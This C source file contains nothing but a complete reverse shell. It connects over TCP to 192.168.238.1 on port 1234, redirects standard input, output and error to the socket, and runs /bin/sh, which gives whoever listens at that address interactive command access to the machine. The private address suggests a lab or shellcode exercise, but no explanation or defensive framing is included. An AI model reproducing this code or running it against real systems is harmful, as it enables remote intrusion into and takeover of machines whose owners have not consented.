#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h> 


int main(void)
{
    int sockfd;
    int port = 1234;
    struct sockaddr_in mysockaddr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    mysockaddr.sin_family = AF_INET;
    mysockaddr.sin_port = htons(port);
    mysockaddr.sin_addr.s_addr = inet_addr("192.168.238.1");

    connect(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
    return 0;
}
